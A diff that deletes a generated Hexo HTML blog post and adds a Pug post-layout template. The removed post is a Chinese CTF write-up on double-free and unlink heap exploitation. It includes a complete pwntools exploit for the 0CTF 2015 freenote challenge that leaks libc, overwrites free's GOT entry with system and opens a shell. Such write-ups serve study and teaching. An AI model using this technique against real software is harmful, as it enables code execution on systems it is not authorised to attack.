@@ -1,292 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>堆漏洞（四）之double-free - Watch Security</title>
-
-<meta name="keywords" content="pwn unlink">
-
-<meta name="description " content="how to pwn with double free">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-            
-                <li class="active">
-                    <a href="/categories/tech-notes" data-name="技术">技术</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/essays" data-name="随笔">随笔</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/cdcitizen-of-the-sun" data-name="海子">海子</a>
-                </li>
-            
-                <li class="">
-                    <a href="/categories/others" data-name="其他">其他</a>
-                </li>
-            
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="/images/favicon.png" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank">Treebacker</a>
-                    <span title="最后编辑于2019-09-05">2019-09-05</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title">堆漏洞（四）之Double-Free</h2>
-            <div class="post-meta">
-                本文总共3732个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <h3 id="堆漏洞利用——Double-Free"><a href="#堆漏洞利用——Double-Free" class="headerlink" title="堆漏洞利用——Double Free"></a>堆漏洞利用——Double Free</h3><h4 id="Double-Free漏洞原理"><a href="#Double-Free漏洞原理" class="headerlink" title="Double Free漏洞原理"></a>Double Free漏洞原理</h4><ul>
-<li>对一个指向malloc分配的heap内存的指针p进行free之后，并没有将该指针置NULL。导致，即使free之后指针p仍然指向heap内存，潜在着利用的可能。</li>
-</ul>
-<h4 id="利用基础"><a href="#利用基础" class="headerlink" title="利用基础"></a>利用基础</h4><ul>
-<li><p>在堆漏洞利用里，很多都是基于触发unlink来实现任意代码执行的，double free也是基于此。关于unlink，这里记录一个讲得清楚明了的博客[初级堆溢出-unlink漏洞][1]。</p>
-</li>
-<li><p>不同于unlink的是，unlink是利用溢出来伪造chunk，实现unlink的。而double free则一般是需要至少获得三个连续的chunk，再全部free。之后再重新分配两个大chunk（能够覆盖前面free的三个chunk），通过伪造p（利用绕过unlink的检查的技术伪造）chunk和一个引导触发unlink的chunk即可。构造如下图</p>
-<p>​                <img src="/2019/09/05/堆漏洞（四）之Double-Free/1.png" title="[]"></p>
-<p>注意，伪造的数据中fake_size 应该等于 fake_pre_size2+1。以满足大小一致检查。</p>
-</li>
-</ul>
-<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><ul>
-<li><p>以2015年0ctf的0ops题目为例（现该题目在jarvis oj平台level6_x64）</p>
-</li>
-<li><p>漏洞分析</p>
-<ul>
-<li><p>信息泄露</p>
-<ul>
-<li><p>这里的读取content的函数实际读取指定的字节数目，并没有’\x00’截断。所以在输出content时，很可能会泄露信息。</p>
-<img src="/2019/09/05/堆漏洞（四）之Double-Free/2.png" title="[]">
-</li>
-<li><p>分析程序知道，分配的chunk大小是0x80的整数倍，可以放在small bin中；可以利用small bins的双向环形链表结构。例如下面的代码产生的small bins的部分结构如图</p>
-<img src="/2019/09/05/堆漏洞（四）之Double-Free/3.png" title="[]">
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
-<p>显然，双向链表使得fd和bk指针可能在某时刻指向chunk地址。而当我们malloc(8)时，仅仅会覆盖fd，bk仍保留一个chunk的地址，输出content时，就会泄露chunk地址。</p>
-</li>
-<li><p>chunk地址和main_arena之间存在着数值上的差值关系，具体的libc可能不一致，建议动手调试计算为准。main_arena的偏移可以在libc文件的main_trim函数中找到。这里main_arena = 0x3c2760，如下展示</p>
-<img src="/2019/09/05/堆漏洞（四）之Double-Free/4.png" title="[]">
-</li>
-</ul>
-</li>
-<li><p>触发unlink，根据以上展示的布局来伪造就好了。</p>
-</li>
-<li><p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = ELF(<span class="string">'./freenote_x64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = context.binary</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">	raw_input(<span class="string">'wait'</span>)</span><br><span class="line">rmt = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> rmt == <span class="number">1</span>:</span><br><span class="line">	p = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9886</span>)</span><br><span class="line">	main_arena = <span class="number">0x3c2760</span></span><br><span class="line">	libc = ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">	p = process([<span class="string">'./freenote_x64'</span>])</span><br><span class="line">	<span class="comment">#gdb.attach(p, 'b* 0x4010B0')</span></span><br><span class="line">	main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">	libc = elf.libc</span><br><span class="line"></span><br><span class="line">dbg()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listnote</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"list note successfully!"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newnote</span><span class="params">(content)</span>:</span></span><br><span class="line">	size = len(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'new note: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"your note: "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"new a note successfully!"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editnote</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">	size = len(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'of note: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">'your note: '</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"edit note %d successfully!"</span> % idx</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletenote</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Your choice: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'number: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"delete note %d successfully!"</span> % idx</span><br><span class="line"></span><br><span class="line">notelen = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">newnote(<span class="string">'a'</span>*notelen)</span><br><span class="line">newnote(<span class="string">'b'</span>*notelen)			<span class="comment">#avoid delete(0), chunk0 will be to topchunk</span></span><br><span class="line">newnote(<span class="string">'c'</span>*notelen)</span><br><span class="line">newnote(<span class="string">'d'</span>*notelen)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">0</span>)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="string">'eeeeeeee'</span>)</span><br><span class="line">newnote(<span class="string">'ffffffff'</span>)</span><br><span class="line">listnote()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'0. eeeeeeee'</span>)</span><br><span class="line">heapbase = u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1940</span></span><br><span class="line">p.recvuntil(<span class="string">'2. ffffffff'</span>)</span><br><span class="line">libcbase = (u64(p.recvline().strip(<span class="string">'\x0a'</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))  - main_arena - <span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libcbase ==&gt; "</span> + hex(libcbase)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heapbase ==&gt; "</span> + hex(heapbase)</span><br><span class="line">libc.base = libcbase</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] + libcbase</span><br><span class="line">bin_sh_addr = libcbase + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system ==&gt; "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh_addr ==&gt; "</span> + hex(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">3</span>)</span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">deletenote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#double free ==&gt; unlink</span></span><br><span class="line"><span class="comment">#note 0</span></span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) + p64(heapbase + <span class="number">0x30</span> - <span class="number">0x18</span>) + p64(heapbase + <span class="number">0x30</span> - <span class="number">0x10</span>)</span><br><span class="line">newnote(payload1)		</span><br><span class="line"></span><br><span class="line"><span class="comment">#note1</span></span><br><span class="line">payload2 = <span class="string">"/bin/sh\x00"</span>.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"><span class="comment">#fake note2</span></span><br><span class="line">payload2 += p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>) + <span class="string">"A"</span>*<span class="number">0x80</span></span><br><span class="line"><span class="comment">#fake note3</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">"A"</span>*<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line">newnote(payload2)			<span class="comment">#1</span></span><br><span class="line">dbg()</span><br><span class="line">deletenote(<span class="number">2</span>)				<span class="comment">#unlink note0			</span></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">payload3 = p64(<span class="number">8</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(free_got)</span><br><span class="line">editnote(<span class="number">0</span>, payload3)</span><br><span class="line"></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">editnote(<span class="number">0</span>, payload4)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-<p>参考链接</p>
-<ul>
-<li>[实战double free和unlink漏洞:0CTF2015 freenote][2]</li>
-<li><a href="https://www.cnblogs.com/0xJDchen/p/6195919.html" target="_blank" rel="noopener">见微知著(二)：解析ctf中的pwn–怎么利用double free</a></li>
-</ul>
-<p>​        </p>
-</li>
-</ul>
-</li>
-</ul>
-<p><a href="https://www.cnblogs.com/Magpie/p/9705942.html" target="_blank" rel="noopener">1</a></p>
-<p><a href="https://www.anquanke.com/post/id/162882" target="_blank" rel="noopener">2</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-            <a href="../../../../tags/pwn/">pwn</a>
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
